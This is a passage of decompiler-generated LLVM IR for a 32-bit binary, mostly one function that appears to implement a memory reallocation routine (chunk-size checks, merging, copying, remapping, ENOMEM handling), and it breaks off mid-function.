  uselistorder label %dec_label_pc_804e526, { 1, 0 }
  uselistorder label %dec_label_pc_804e4d1, { 1, 0 }
  uselistorder label %dec_label_pc_804e476, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804e408, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e403, { 1, 0 }
  uselistorder label %dec_label_pc_804e3e7, { 1, 0 }
  uselistorder label %dec_label_pc_804e390, { 1, 0 }
  uselistorder label %dec_label_pc_804e379, { 1, 0 }
  uselistorder label %dec_label_pc_804e362, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804e319, { 1, 0 }
  uselistorder label %dec_label_pc_804e2d7, { 1, 0 }
  uselistorder label %dec_label_pc_804e26e, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804e20d, { 1, 0 }
  uselistorder label %dec_label_pc_804e121, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e119, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e08d, { 1, 0 }
  uselistorder label %dec_label_pc_804e092.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804e066, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804dfed, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_804df74, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804df5d, { 1, 0 }
  uselistorder label %dec_label_pc_804decb, { 1, 0 }
  uselistorder label %dec_label_pc_804df9c.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804de98, { 1, 0 }
  uselistorder label %dec_label_pc_804de16, { 1, 0 }
}

define i32 @function_804e55c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804e55c:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp8 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_804e55f = load i32, i32* @ebx, align 4
  %v4_804e563 = icmp eq i32* %arg1, null
  store i32 %arg2, i32* @ebx, align 4
  %v1_804e56c = icmp eq i1 %v4_804e563, false
  br i1 %v1_804e56c, label %dec_label_pc_804e57e, label %dec_label_pc_804e56e

dec_label_pc_804e56e:                             ; preds = %dec_label_pc_804e55c
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_804e572 = call i32 @function_804ddba(i32 %arg2)
  store i32 %v1_804e572, i32* %eax.global-to-local, align 4
  store i32 %v1_804e572, i32* @ebx, align 4
  br label %dec_label_pc_804e885

dec_label_pc_804e57e:                             ; preds = %dec_label_pc_804e55c
  %v1_804e57e = icmp eq i32 %arg2, 0
  %v1_804e580 = icmp eq i1 %v1_804e57e, false
  br i1 %v1_804e580, label %dec_label_pc_804e593, label %dec_label_pc_804e582

dec_label_pc_804e582:                             ; preds = %dec_label_pc_804e57e
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_804e589 = call i32 @function_804eac9(i32 %tmp8)
  store i32 %v1_804e589, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e885

dec_label_pc_804e593:                             ; preds = %dec_label_pc_804e57e
  %v2_804e59e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e59e, i32* @eax, align 4
  store i32 %v2_804e59e, i32* %stack_var_-60, align 4
  %v2_804e5a3 = call i32 @function_804f65e(i32 %v2_804e59e, i32 134542939)
  store i32 %v2_804e5a3, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056330.140 to i32), i32* %stack_var_-60, align 4
  %v1_804e5af = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056330.140 to i32))
  store i32 %v1_804e5af, i32* %eax.global-to-local, align 4
  %v0_804e5b7 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_804e5b7, -32
  br i1 %tmp, label %dec_label_pc_804e5ce, label %dec_label_pc_804e5bc

dec_label_pc_804e5bc:                             ; preds = %dec_label_pc_804e593
  %v0_804e5bc = load i32, i32* %stack_var_-60, align 4
  %v1_804e5bc = call i32 @function_804baa4(i32 %v0_804e5bc)
  store i32 %v1_804e5bc, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804e5c3 = inttoptr i32 %v1_804e5bc to i32*
  store i32 12, i32* %v1_804e5c3, align 4
  br label %dec_label_pc_804e888

dec_label_pc_804e5ce:                             ; preds = %dec_label_pc_804e593
  %v1_804e5ce = add i32 %v0_804e5b7, 11
  %tmp22 = icmp ult i32 %v1_804e5ce, 16
  br i1 %tmp22, label %dec_label_pc_804e5e5, label %dec_label_pc_804e5de

dec_label_pc_804e5de:                             ; preds = %dec_label_pc_804e5ce
  %v1_804e5de = and i32 %v1_804e5ce, -8
  br label %dec_label_pc_804e5e5

dec_label_pc_804e5e5:                             ; preds = %dec_label_pc_804e5ce, %dec_label_pc_804e5de
  %stack_var_-40.0 = phi i32 [ %v1_804e5de, %dec_label_pc_804e5de ], [ 16, %dec_label_pc_804e5ce ]
  %storemerge21 = phi i32 [ %v1_804e5de, %dec_label_pc_804e5de ], [ %v1_804e5ce, %dec_label_pc_804e5ce ]
  store i32 %storemerge21, i32* %eax.global-to-local, align 4
  %v1_804e5e9 = add i32 %tmp8, -8
  store i32 %v1_804e5e9, i32* @edi, align 4
  %v1_804e5ec = add i32 %tmp8, -4
  %v2_804e5ec = inttoptr i32 %v1_804e5ec to i32*
  %v3_804e5ec = load i32, i32* %v2_804e5ec, align 4
  store i32 %v3_804e5ec, i32* %edx.global-to-local, align 4
  %v1_804e5f1 = and i32 %v3_804e5ec, -4
  store i32 %v1_804e5f1, i32* %eax.global-to-local, align 4
  %v2_804e5f4 = and i32 %v3_804e5ec, 2
  %v3_804e5f4 = icmp eq i32 %v2_804e5f4, 0
  %v1_804e5fb = icmp eq i1 %v3_804e5f4, false
  br i1 %v1_804e5fb, label %dec_label_pc_804e795, label %dec_label_pc_804e601

dec_label_pc_804e601:                             ; preds = %dec_label_pc_804e5e5
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_804e5f1, i32* @ebx, align 4
  %v7_804e607 = icmp ult i32 %v1_804e5f1, %stack_var_-40.0
  %v1_804e609 = icmp eq i1 %v7_804e607, false
  br i1 %v1_804e609, label %dec_label_pc_804e740, label %dec_label_pc_804e60f

dec_label_pc_804e60f:                             ; preds = %dec_label_pc_804e601
  %v2_804e60f = add i32 %v1_804e5f1, %v1_804e5e9
  store i32 %v2_804e60f, i32* @esi, align 4
  %v1_804e612 = load i32, i32* @global_var_8058dcc.142, align 4
  %v12_804e612 = icmp eq i32 %v2_804e60f, %v1_804e612
  %v1_804e618 = icmp eq i1 %v12_804e612, false
  %v1_804e652 = add i32 %v2_804e60f, 4
  %v2_804e652 = inttoptr i32 %v1_804e652 to i32*
  %v3_804e652 = load i32, i32* %v2_804e652, align 4
  br i1 %v1_804e618, label %dec_label_pc_804e652, label %dec_label_pc_804e61a

dec_label_pc_804e61a:                             ; preds = %dec_label_pc_804e60f
  %v1_804e61f = and i32 %v3_804e652, -4
  %v2_804e622 = add i32 %v1_804e61f, %v1_804e5f1
  store i32 %v2_804e622, i32* %ecx.global-to-local, align 4
  %v1_804e628 = add i32 %stack_var_-40.0, 16
  store i32 %v1_804e628, i32* %eax.global-to-local, align 4
  %v7_804e62b = icmp ult i32 %v2_804e622, %v1_804e628
  br i1 %v7_804e62b, label %dec_label_pc_804e690, label %dec_label_pc_804e62f

dec_label_pc_804e62f:                             ; preds = %dec_label_pc_804e61a
  %v1_804e62f = urem i32 %v3_804e5ec, 2
  %v5_804e632 = or i32 %v1_804e62f, %stack_var_-40.0
  store i32 %v5_804e632, i32* %edx.global-to-local, align 4
  store i32 %v5_804e632, i32* %v2_804e5ec, align 4
  %v0_804e63d = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e63d = sub i32 %v0_804e63d, %stack_var_-40.0
  %v0_804e63f = load i32, i32* @edi, align 4
  %v2_804e63f = add i32 %v0_804e63f, %stack_var_-40.0
  store i32 %v2_804e63f, i32* %eax.global-to-local, align 4
  %v1_804e642 = or i32 %v2_804e63d, 1
  store i32 %v1_804e642, i32* %ecx.global-to-local, align 4
  store i32 %v2_804e63f, i32* @global_var_8058dcc.142, align 4
  %v2_804e64a = add i32 %v2_804e63f, 4
  %v3_804e64a = inttoptr i32 %v2_804e64a to i32*
  store i32 %v1_804e642, i32* %v3_804e64a, align 4
  br label %dec_label_pc_804e873

dec_label_pc_804e652:                             ; preds = %dec_label_pc_804e60f
  store i32 %v3_804e652, i32* %edx.global-to-local, align 4
  %v1_804e657 = and i32 %v3_804e652, -2
  store i32 %v1_804e657, i32* %eax.global-to-local, align 4
  %v3_804e65a = add i32 %v1_804e652, %v1_804e657
  %v4_804e65a = inttoptr i32 %v3_804e65a to i8*
  %v5_804e65a = load i8, i8* %v4_804e65a, align 1
  %v6_804e65a = urem i8 %v5_804e65a, 2
  %v7_804e65a = icmp eq i8 %v6_804e65a, 0
  %v1_804e65f = icmp eq i1 %v7_804e65a, false
  br i1 %v1_804e65f, label %dec_label_pc_804e690, label %dec_label_pc_804e661

dec_label_pc_804e661:                             ; preds = %dec_label_pc_804e652
  %v1_804e665 = and i32 %v3_804e652, -4
  store i32 %v1_804e665, i32* %edx.global-to-local, align 4
  %v2_804e668 = add i32 %v1_804e665, %v1_804e5f1
  store i32 %v2_804e668, i32* @ebx, align 4
  %v10_804e66a = icmp ult i32 %v2_804e668, %stack_var_-40.0
  br i1 %v10_804e66a, label %dec_label_pc_804e690, label %dec_label_pc_804e670

dec_label_pc_804e670:                             ; preds = %dec_label_pc_804e661
  %v1_804e670 = add i32 %v1_804e5f1, %tmp8
  %v2_804e670 = inttoptr i32 %v1_804e670 to i32*
  %v3_804e670 = load i32, i32* %v2_804e670, align 4
  store i32 %v3_804e670, i32* @edx, align 4
  %v1_804e673 = add i32 %v2_804e60f, 12
  %v2_804e673 = inttoptr i32 %v1_804e673 to i32*
  %v3_804e673 = load i32, i32* %v2_804e673, align 4
  store i32 %v3_804e673, i32* %eax.global-to-local, align 4
  %v1_804e676 = add i32 %v3_804e670, 12
  %v2_804e676 = inttoptr i32 %v1_804e676 to i32*
  %v3_804e676 = load i32, i32* %v2_804e676, align 4
  %v15_804e676 = icmp eq i32 %v3_804e676, %v2_804e60f
  %v1_804e679 = icmp eq i1 %v15_804e676, false
  br i1 %v1_804e679, label %dec_label_pc_804e680, label %dec_label_pc_804e67b

dec_label_pc_804e67b:                             ; preds = %dec_label_pc_804e670
  %v1_804e67b = add i32 %v3_804e673, 8
  %v2_804e67b = inttoptr i32 %v1_804e67b to i32*
  %v3_804e67b = load i32, i32* %v2_804e67b, align 4
  %v15_804e67b = icmp eq i32 %v3_804e67b, %v2_804e60f
  br i1 %v15_804e67b, label %dec_label_pc_804e685, label %dec_label_pc_804e680

dec_label_pc_804e680:                             ; preds = %dec_label_pc_804e67b, %dec_label_pc_804e670
  %v0_804e680 = call i32 @function_804ec88()
  store i32 %v0_804e680, i32* %eax.global-to-local, align 4
  %v1_804e685.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e685

dec_label_pc_804e685:                             ; preds = %dec_label_pc_804e67b, %dec_label_pc_804e680
  %v1_804e685 = phi i32 [ %v3_804e670, %dec_label_pc_804e67b ], [ %v1_804e685.pre, %dec_label_pc_804e680 ]
  %v0_804e685 = phi i32 [ %v3_804e673, %dec_label_pc_804e67b ], [ %v0_804e680, %dec_label_pc_804e680 ]
  %v2_804e685 = add i32 %v1_804e685, 12
  %v3_804e685 = inttoptr i32 %v2_804e685 to i32*
  store i32 %v0_804e685, i32* %v3_804e685, align 4
  %v0_804e688 = load i32, i32* @edx, align 4
  %v1_804e688 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e688 = add i32 %v1_804e688, 8
  %v3_804e688 = inttoptr i32 %v2_804e688 to i32*
  store i32 %v0_804e688, i32* %v3_804e688, align 4
  %v0_804e740.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e740

dec_label_pc_804e690:                             ; preds = %dec_label_pc_804e661, %dec_label_pc_804e652, %dec_label_pc_804e61a
  %v1_804e697 = add i32 %stack_var_-40.0, -7
  store i32 %v1_804e697, i32* %eax.global-to-local, align 4
  store i32 %v1_804e697, i32* %stack_var_-60, align 4
  %v1_804e69b = call i32 @function_804ddba(i32 %v1_804e697)
  store i32 %v1_804e69b, i32* %eax.global-to-local, align 4
  %v1_804e6a3 = icmp eq i32 %v1_804e69b, 0
  store i32 %v1_804e69b, i32* %edx.global-to-local, align 4
  br i1 %v1_804e6a3, label %dec_label_pc_804e86f, label %dec_label_pc_804e6ad

dec_label_pc_804e6ad:                             ; preds = %dec_label_pc_804e690
  %v1_804e6ad = add i32 %v1_804e69b, -8
  store i32 %v1_804e6ad, i32* %ebx.global-to-local, align 4
  %v1_804e6b0 = load i32, i32* @esi, align 4
  %v12_804e6b0 = icmp eq i32 %v1_804e6ad, %v1_804e6b0
  %v1_804e6b2 = add i32 %v1_804e69b, -4
  %v2_804e6b2 = inttoptr i32 %v1_804e6b2 to i32*
  %v3_804e6b2 = load i32, i32* %v2_804e6b2, align 4
  store i32 %v3_804e6b2, i32* %eax.global-to-local, align 4
  %v1_804e6b5 = icmp eq i1 %v12_804e6b0, false
  br i1 %v1_804e6b5, label %dec_label_pc_804e6c3, label %dec_label_pc_804e6b7

dec_label_pc_804e6b7:                             ; preds = %dec_label_pc_804e6ad
  store i32 %v1_804e5f1, i32* %edx.global-to-local, align 4
  %v1_804e6bb = and i32 %v3_804e6b2, -4
  store i32 %v1_804e6bb, i32* %eax.global-to-local, align 4
  %v2_804e6be = add i32 %v1_804e6bb, %v1_804e5f1
  store i32 %v2_804e6be, i32* @ebx, align 4
  br label %dec_label_pc_804e740

dec_label_pc_804e6c3:                             ; preds = %dec_label_pc_804e6ad
  %v1_804e6c7 = add i32 %v1_804e5f1, -4
  store i32 %v1_804e6c7, i32* %eax.global-to-local, align 4
  %v2_804e6cc = udiv i32 %v1_804e6c7, 4
  store i32 %v2_804e6cc, i32* %ecx.global-to-local, align 4
  %tmp23 = icmp ult i32 %v1_804e6c7, 37
  br i1 %tmp23, label %dec_label_pc_804e6e5, label %dec_label_pc_804e6d4

dec_label_pc_804e6d4:                             ; preds = %dec_label_pc_804e6c3
  store i32 %v1_804e69b, i32* %stack_var_-60, align 4
  %v3_804e6db = inttoptr i32 %v1_804e69b to i16*
  %v4_804e6db = call i32 @function_804d4b8(i16* %v3_804e6db, i32 %tmp8, i32 %v1_804e6c7)
  store i32 %v4_804e6db, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e72c

dec_label_pc_804e6e5:                             ; preds = %dec_label_pc_804e6c3
  store i32 %tmp8, i32* @esi, align 4
  %v2_804e6ec = load i32, i32* %arg1, align 4
  store i32 %v2_804e6ec, i32* %eax.global-to-local, align 4
  %v2_804e6ee = inttoptr i32 %v1_804e69b to i32*
  store i32 %v2_804e6ec, i32* %v2_804e6ee, align 4
  %v0_804e6f0 = load i32, i32* @esi, align 4
  %v1_804e6f0 = add i32 %v0_804e6f0, 4
  %v2_804e6f0 = inttoptr i32 %v1_804e6f0 to i32*
  %v3_804e6f0 = load i32, i32* %v2_804e6f0, align 4
  store i32 %v3_804e6f0, i32* %eax.global-to-local, align 4
  %v1_804e6f3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e6f3 = add i32 %v1_804e6f3, 4
  %v3_804e6f3 = inttoptr i32 %v2_804e6f3 to i32*
  store i32 %v3_804e6f0, i32* %v3_804e6f3, align 4
  %v0_804e6f6 = load i32, i32* @esi, align 4
  %v1_804e6f6 = add i32 %v0_804e6f6, 8
  %v2_804e6f6 = inttoptr i32 %v1_804e6f6 to i32*
  %v3_804e6f6 = load i32, i32* %v2_804e6f6, align 4
  store i32 %v3_804e6f6, i32* %eax.global-to-local, align 4
  %v1_804e6f9 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e6f9 = add i32 %v1_804e6f9, 8
  %v3_804e6f9 = inttoptr i32 %v2_804e6f9 to i32*
  store i32 %v3_804e6f6, i32* %v3_804e6f9, align 4
  %tmp24 = icmp ult i32 %v1_804e6c7, 17
  br i1 %tmp24, label %dec_label_pc_804e72c, label %dec_label_pc_804e6fe

dec_label_pc_804e6fe:                             ; preds = %dec_label_pc_804e6e5
  %v0_804e6fe = load i32, i32* @esi, align 4
  %v1_804e6fe = add i32 %v0_804e6fe, 12
  %v2_804e6fe = inttoptr i32 %v1_804e6fe to i32*
  %v3_804e6fe = load i32, i32* %v2_804e6fe, align 4
  store i32 %v3_804e6fe, i32* %eax.global-to-local, align 4
  %v0_804e701 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e704 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e704 = add i32 %v1_804e704, 12
  %v3_804e704 = inttoptr i32 %v2_804e704 to i32*
  store i32 %v3_804e6fe, i32* %v3_804e704, align 4
  %v0_804e707 = load i32, i32* @esi, align 4
  %v1_804e707 = add i32 %v0_804e707, 16
  %v2_804e707 = inttoptr i32 %v1_804e707 to i32*
  %v3_804e707 = load i32, i32* %v2_804e707, align 4
  store i32 %v3_804e707, i32* %eax.global-to-local, align 4
  %v1_804e70a = load i32, i32* %edx.global-to-local, align 4
  %v2_804e70a = add i32 %v1_804e70a, 16
  %v3_804e70a = inttoptr i32 %v2_804e70a to i32*
  store i32 %v3_804e707, i32* %v3_804e70a, align 4
  %tmp25 = icmp ult i32 %v0_804e701, 7
  br i1 %tmp25, label %dec_label_pc_804e72c, label %dec_label_pc_804e70f

dec_label_pc_804e70f:                             ; preds = %dec_label_pc_804e6fe
  %v0_804e70f = load i32, i32* @esi, align 4
  %v1_804e70f = add i32 %v0_804e70f, 20
  %v2_804e70f = inttoptr i32 %v1_804e70f to i32*
  %v3_804e70f = load i32, i32* %v2_804e70f, align 4
  store i32 %v3_804e70f, i32* %eax.global-to-local, align 4
  %v0_804e712 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e715 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e715 = add i32 %v1_804e715, 20
  %v3_804e715 = inttoptr i32 %v2_804e715 to i32*
  store i32 %v3_804e70f, i32* %v3_804e715, align 4
  %v0_804e718 = load i32, i32* @esi, align 4
  %v1_804e718 = add i32 %v0_804e718, 24
  %v2_804e718 = inttoptr i32 %v1_804e718 to i32*
  %v3_804e718 = load i32, i32* %v2_804e718, align 4
  store i32 %v3_804e718, i32* %eax.global-to-local, align 4
  %v1_804e71b = load i32, i32* %edx.global-to-local, align 4
  %v2_804e71b = add i32 %v1_804e71b, 24
  %v3_804e71b = inttoptr i32 %v2_804e71b to i32*
  store i32 %v3_804e718, i32* %v3_804e71b, align 4
  %tmp26 = icmp ult i32 %v0_804e712, 9
  br i1 %tmp26, label %dec_label_pc_804e72c, label %dec_label_pc_804e720

dec_label_pc_804e720:                             ; preds = %dec_label_pc_804e70f
  %v0_804e720 = load i32, i32* @esi, align 4
  %v1_804e720 = add i32 %v0_804e720, 28
  %v2_804e720 = inttoptr i32 %v1_804e720 to i32*
  %v3_804e720 = load i32, i32* %v2_804e720, align 4
  store i32 %v3_804e720, i32* %eax.global-to-local, align 4
  %v1_804e723 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e723 = add i32 %v1_804e723, 28
  %v3_804e723 = inttoptr i32 %v2_804e723 to i32*
  store i32 %v3_804e720, i32* %v3_804e723, align 4
  %v0_804e726 = load i32, i32* @esi, align 4
  %v1_804e726 = add i32 %v0_804e726, 32
  %v2_804e726 = inttoptr i32 %v1_804e726 to i32*
  %v3_804e726 = load i32, i32* %v2_804e726, align 4
  store i32 %v3_804e726, i32* %eax.global-to-local, align 4
  %v1_804e729 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e729 = add i32 %v1_804e729, 32
  %v3_804e729 = inttoptr i32 %v2_804e729 to i32*
  store i32 %v3_804e726, i32* %v3_804e729, align 4
  br label %dec_label_pc_804e72c

dec_label_pc_804e72c:                             ; preds = %dec_label_pc_804e70f, %dec_label_pc_804e6fe, %dec_label_pc_804e6e5, %dec_label_pc_804e6d4, %dec_label_pc_804e720
  %v0_804e72f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e72f = add i32 %v0_804e72f, 8
  store i32 %v1_804e72f, i32* @ebx, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_804e736 = call i32 @function_804eac9(i32 %tmp8)
  br label %dec_label_pc_804e86a

dec_label_pc_804e740:                             ; preds = %dec_label_pc_804e601, %dec_label_pc_804e6b7, %dec_label_pc_804e685
  %v1_804e751 = phi i32 [ %v1_804e5f1, %dec_label_pc_804e601 ], [ %v2_804e6be, %dec_label_pc_804e6b7 ], [ %v0_804e740.pre, %dec_label_pc_804e685 ]
  %v5_804e742 = sub i32 %v1_804e751, %stack_var_-40.0
  store i32 %v5_804e742, i32* %ecx.global-to-local, align 4
  %tmp27 = icmp ult i32 %v5_804e742, 16
  br i1 %tmp27, label %dec_label_pc_804e74b, label %dec_label_pc_804e75d

dec_label_pc_804e74b:                             ; preds = %dec_label_pc_804e740
  %v0_804e74b = load i32, i32* @edi, align 4
  %v1_804e74b = add i32 %v0_804e74b, 4
  %v2_804e74b = inttoptr i32 %v1_804e74b to i32*
  %v3_804e74b = load i32, i32* %v2_804e74b, align 4
  %v1_804e74e = urem i32 %v3_804e74b, 2
  %v2_804e751 = or i32 %v1_804e74e, %v1_804e751
  store i32 %v2_804e751, i32* %eax.global-to-local, align 4
  store i32 %v2_804e751, i32* %v2_804e74b, align 4
  %v0_804e756 = load i32, i32* @edi, align 4
  %v1_804e756 = load i32, i32* @ebx, align 4
  %v2_804e756 = add i32 %v0_804e756, 4
  %v3_804e756 = add i32 %v2_804e756, %v1_804e756
  %v4_804e756 = inttoptr i32 %v3_804e756 to i32*
  %v5_804e756 = load i32, i32* %v4_804e756, align 4
  %v6_804e756 = or i32 %v5_804e756, 1
  store i32 %v6_804e756, i32* %v4_804e756, align 4
  br label %dec_label_pc_804e78d

dec_label_pc_804e75d:                             ; preds = %dec_label_pc_804e740
  store i32 %stack_var_-40.0, i32* %edx.global-to-local, align 4
  %v0_804e761 = load i32, i32* @edi, align 4
  %v2_804e761 = add i32 %v0_804e761, %stack_var_-40.0
  store i32 %v2_804e761, i32* %eax.global-to-local, align 4
  %v1_804e764 = add i32 %v0_804e761, 4
  %v2_804e764 = inttoptr i32 %v1_804e764 to i32*
  %v3_804e764 = load i32, i32* %v2_804e764, align 4
  %v1_804e767 = urem i32 %v3_804e764, 2
  %v5_804e76a = or i32 %v1_804e767, %stack_var_-40.0
  store i32 %v5_804e76a, i32* %v2_804e764, align 4
  %v0_804e774 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e776 = or i32 %v0_804e774, 1
  store i32 %v1_804e776, i32* %edx.global-to-local, align 4
  %v1_804e779 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e779 = add i32 %v1_804e779, 4
  %v3_804e779 = inttoptr i32 %v2_804e779 to i32*
  store i32 %v1_804e776, i32* %v3_804e779, align 4
  %v0_804e77c = load i32, i32* %eax.global-to-local, align 4
  %v1_804e77c = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e77c = add i32 %v0_804e77c, 4
  %v3_804e77c = add i32 %v2_804e77c, %v1_804e77c
  %v4_804e77c = inttoptr i32 %v3_804e77c to i32*
  %v5_804e77c = load i32, i32* %v4_804e77c, align 4
  %v6_804e77c = or i32 %v5_804e77c, 1
  store i32 %v6_804e77c, i32* %v4_804e77c, align 4
  %v0_804e781 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e781 = add i32 %v0_804e781, 8
  store i32 %v1_804e781, i32* %eax.global-to-local, align 4
  store i32 %v1_804e781, i32* %stack_var_-60, align 4
  %v1_804e785 = call i32 @function_804eac9(i32 %v1_804e781)
  store i32 %v1_804e785, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e78d

dec_label_pc_804e78d:                             ; preds = %dec_label_pc_804e74b, %dec_label_pc_804e75d
  %v0_804e78d = load i32, i32* @edi, align 4
  %v1_804e78d = add i32 %v0_804e78d, 8
  store i32 %v1_804e78d, i32* @ebx, align 4
  br label %dec_label_pc_804e877

dec_label_pc_804e795:                             ; preds = %dec_label_pc_804e5e5
  store i32 %tmp8, i32* %ecx.global-to-local, align 4
  %v0_804e799 = load i32, i32* @global_var_80590fc.147, align 4
  store i32 %v0_804e799, i32* %eax.global-to-local, align 4
  %v2_804e7a2 = inttoptr i32 %v1_804e5e9 to i32*
  %v3_804e7a2 = load i32, i32* %v2_804e7a2, align 4
  store i32 %v3_804e7a2, i32* @ebp, align 4
  %v1_804e7a5 = add i32 %v0_804e799, -1
  %v1_804e7a6 = or i32 %stack_var_-40.0, 4
  store i32 %v1_804e7a6, i32* %stack_var_-44, align 4
  %v2_804e7ac = add i32 %v1_804e7a5, %v3_804e7a2
  store i32 %v2_804e7ac, i32* %edx.global-to-local, align 4
  %v1_804e7af = sub i32 0, %v0_804e799
  store i32 %v1_804e7af, i32* %eax.global-to-local, align 4
  %v2_804e7b1 = add i32 %v2_804e7ac, %v1_804e7a6
  %v2_804e7b4 = and i32 %v2_804e7b1, %v1_804e7af
  store i32 %v2_804e7b4, i32* @esi, align 4
  %v2_804e7b8 = sub i32 %v2_804e7b4, %v3_804e7a2
  store i32 %v2_804e7b8, i32* @ebx, align 4
  %v15_804e7ba = icmp eq i32 %v1_804e5f1, %v2_804e7b8
  br i1 %v15_804e7ba, label %dec_label_pc_804e873, label %dec_label_pc_804e7c4

dec_label_pc_804e7c4:                             ; preds = %dec_label_pc_804e795
  %v2_804e7c6 = sub i32 %v1_804e5e9, %v3_804e7a2
  store i32 %v2_804e7c6, i32* @edi, align 4
  %v2_804e7cd = add i32 %v3_804e7a2, %v1_804e5f1
  store i32 %v2_804e7cd, i32* %eax.global-to-local, align 4
  store i32 %v2_804e7c6, i32* %stack_var_-60, align 4
  %v6_804e7d1 = inttoptr i32 %v2_804e7c6 to i32*
  %v7_804e7d1 = call i32 @function_804fc7c(i32* %v6_804e7d1, i32 %v2_804e7cd, i32 %v2_804e7b4, i32 1, i32 %v1_804e7a6, i32 %v1_804e5f1)
  store i32 %v7_804e7d1, i32* %eax.global-to-local, align 4
  %v10_804e7d9 = icmp eq i32 %v7_804e7d1, -1
  br i1 %v10_804e7d9, label %dec_label_pc_804e82b, label %dec_label_pc_804e7de

dec_label_pc_804e7de:                             ; preds = %dec_label_pc_804e7c4
  %v1_804e7de = load i32, i32* @ebp, align 4
  %v2_804e7de = add i32 %v1_804e7de, %v7_804e7d1
  store i32 %v2_804e7de, i32* %eax.global-to-local, align 4
  %v0_804e7e0 = load i32, i32* @ebx, align 4
  %v1_804e7e0 = or i32 %v0_804e7e0, 2
  %v2_804e7e3 = add i32 %v2_804e7de, 4
  %v3_804e7e3 = inttoptr i32 %v2_804e7e3 to i32*
  store i32 %v1_804e7e0, i32* %v3_804e7e3, align 4
  %v0_804e7e6 = load i32, i32* @esi, align 4
  %v5_804e7e8 = sub i32 %v0_804e7e6, %v1_804e5f1
  %v0_804e7ec = load i32, i32* @global_var_8059110.151, align 16
  %v0_804e7f2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7f2 = add i32 %v0_804e7f2, 8
  store i32 %v1_804e7f2, i32* @ebx, align 4
  %v1_804e7f5 = load i32, i32* @global_var_8059104.153, align 4
  %v2_804e7f5 = add i32 %v1_804e7f5, %v5_804e7e8
  store i32 %v2_804e7f5, i32* @global_var_8059104.153, align 4
  %tmp20 = icmp ule i32 %v2_804e7f5, %v0_804e7ec
  %v5_804e807 = select i1 %tmp20, i32 %v0_804e7ec, i32 %v2_804e7f5
  store i32 %v5_804e807, i32* %ecx.global-to-local, align 4
  %v1_804e80a = load i32, i32* @global_var_8059108.154, align 8
  %v2_804e80a = add i32 %v1_804e80a, %v2_804e7f5
  store i32 %v5_804e807, i32* @global_var_8059110.151, align 16
  %v1_804e816 = load i32, i32* @global_var_8059114.155, align 4
  %tmp28 = icmp ule i32 %v2_804e80a, %v1_804e816
  %v5_804e81c = select i1 %tmp28, i32 %v1_804e816, i32 %v2_804e80a
  store i32 %v5_804e81c, i32* %edx.global-to-local, align 4
  store i32 %v5_804e81c, i32* @global_var_8059114.155, align 4
  br label %dec_label_pc_804e877

dec_label_pc_804e82b:                             ; preds = %dec_label_pc_804e7c4
  %v2_804e82b = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_804e82b, i32* %eax.global-to-local, align 4
  %v10_804e82e = icmp ult i32 %v1_804e5f1, %v2_804e82b
  %v1_804e832 = icmp eq i1 %v10_804e82e, false
  br i1 %v1_804e832, label %dec_label_pc_804e873, label %dec_label_pc_804e834

dec_label_pc_804e834:                             ; preds = %dec_label_pc_804e82b
  %v1_804e83b = add i32 %stack_var_-40.0, -7
  store i32 %v1_804e83b, i32* %eax.global-to-local, align 4
  store i32 %v1_804e83b, i32* %stack_var_-60, align 4
  %v1_804e83f = call i32 @function_804ddba(i32 %v1_804e83b)
  store i32 %v1_804e83f, i32* %eax.global-to-local, align 4
  %v1_804e847 = icmp eq i32 %v1_804e83f, 0
  store i32 %v1_804e83f, i32* @ebx, align 4
  br i1 %v1_804e847, label %dec_label_pc_804e86f, label %dec_label_pc_804e84d

dec_label_pc_804e84d:                             ; preds = %dec_label_pc_804e834
  %v1_804e852 = add i32 %v1_804e5f1, -8
  store i32 %v1_804e852, i32* %eax.global-to-local, align 4
